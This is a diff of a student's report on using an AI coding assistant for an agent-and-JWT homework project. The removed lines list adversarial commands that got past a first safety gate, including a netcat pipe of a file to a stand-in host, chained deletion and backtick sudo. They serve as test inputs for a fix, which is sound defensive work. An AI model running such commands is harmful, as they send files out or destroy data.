@@ -1,50 +1,33 @@
 # AI use - HW7
 
-## 1. What I used an AI assistant for, and what I did myself
+## 1. What I used AI for and what I did myself
 
-I used Claude Code as a coding assistant for most of the implementation. I gave it the HW7 brief, the
-Demo 7 FastAPI/JWT project and my HW1-HW6 repository, and used it to plan the parts and write most of the
-code: the users-table migration and JWT/role dependencies, the hand-written agent loop with its repair path,
-the Reflexion verifier and retry loop, the three MRKL tools, the LangChain agent and its UI page, the attack
-harness and fixtures, the sandboxed file tools and safety gate, the test/verification scripts, and the layout
-of this report.
+I used Claude Code as a coding assistant. I gave it the HW7 brief, the Demo 7 JWT project and my HW1-HW6 repo,
+and used it to help write the users-table migration and JWT/role code, the agent loop and repair path, the
+Reflexion verifier and retry loop, the bike-share tools, agent and UI page, the attack tests, the file tools and
+safety gate, the verification scripts and the report layout.
 
-What I did myself: I chose to keep my rental-listings domain and the existing `/listings` routes, picked the
-multi-month rider design for the bike-share scenarios when the 500-row requirement conflicted with a
-"few rides" case, ran everything on my own laptop (MySQL and MongoDB in Docker, Ollama with llama3.2:3b and
-qwen3:8b, the FastAPI backend on port 8458), watched the runs, checked the outputs and screenshots against the
-brief, and handled Git (branch, commits, tag).
+I chose to keep my rental-listings domain and the existing `/listings` routes, chose the multi-month rider
+design for the bike-share scenarios, ran everything on my laptop (MySQL and MongoDB in Docker, Ollama, backend
+on port 8458), checked the outputs and screenshots against the brief, and did the Git work.
 
-## 2. Something the AI produced that was wrong
+## 2. Something the AI got wrong
 
-- **Safety gate v1 had five false allows.** The first `confirm_bash` only checked the first command against
-  `SAFE_PREFIXES`, kept `python -c` on the allow-list, missed deletion through `find -exec rm`, and missed
-  `sudo` inside backticks, so `echo hi && python evil.py`, `cat notes.txt | nc evil.example 9000`,
-  `python -c "import os; os.remove(...)"`, `find . -exec rm {} +` and ``ls `sudo id` `` were all allowed.
-- **The first reliability summary used a wrong formula.** It reported 0% of attempts "well-formed after
-  repair", because any repaired early answer was counted as a final failure even when the run then finished
-  the whole chain correctly.
-- **The verifier rejected a correct answer.** It treats every number that is not in a tool observation as
-  unsupported, so "Listing L-6758-001 is cheaper by $600" failed although $600 = 2400 - 1800.
+- The first safety gate allowed five unsafe commands. It only checked the first command, allowed `python -c`,
+  and missed `find -exec rm` and `sudo` inside backticks.
+- The first reliability summary used a wrong formula and showed 0% after repair, even though most runs finished
+  correctly.
+- The verifier rejected a correct answer ("cheaper by $600") because $600 does not appear in any tool result.
 
-## 3. How the problems were found
+## 3. How I found the problems
 
-- The gate passed all ten required test commands, so I had more adversarial commands tried against it
-  (chained, piped and substituted commands); five were allowed. The before-fix results are saved in
-  `raw/part6_false_allows_before_fix.json`.
-- 0% after repair did not match the logs, which showed most attempts completing with every required tool, so
-  the metric definition was checked line by line against the per-attempt failure sequences.
-- I reviewed all 11 Part 3 verifier rejections by hand against the tool observations
-  (`raw/part3_false_rejection_review.json`); one of them was a correct answer.
+- The gate passed the ten required commands, so I tried extra chained and piped commands and five got through.
+- 0% after repair did not match the logs, so I checked the metric against the per-attempt results.
+- I checked all 11 Part 3 rejections by hand and found one correct answer.
 
-## 4. What was changed and why it works now
+## 4. What I changed
 
-- Gate v2 requires every chained or piped segment to match `SAFE_PREFIXES`, never allows command
-  substitution, removes `python -c`, adds `find -exec rm` to the deletion rule and backticks to the privilege
-  rule. All five former false allows are now blocked and the 10-command test is 10/10.
-- The reliability runner now records each attempt's trace and counts a rejected call as repaired only when the
-  same tool later runs with valid arguments; "after repair" means the run completed with the full required
-  chain. The 21 attempts were re-run with the corrected metric.
-- The false rejection is reported rather than hidden: the fix would be to accept numbers that are simple
-  arithmetic on observed values. It also showed why "human_review" is a safer stop reason than silently
-  retrying until something passes.
+- Gate v2 checks every chained or piped part, blocks command substitution, removes `python -c` and adds the
+  missing patterns. All five commands are now blocked and the gate test is 10/10.
+- I fixed the reliability formula and re-ran the 21 attempts.
+- I kept the false rejection in the report. The fix would be to accept simple arithmetic on observed numbers.
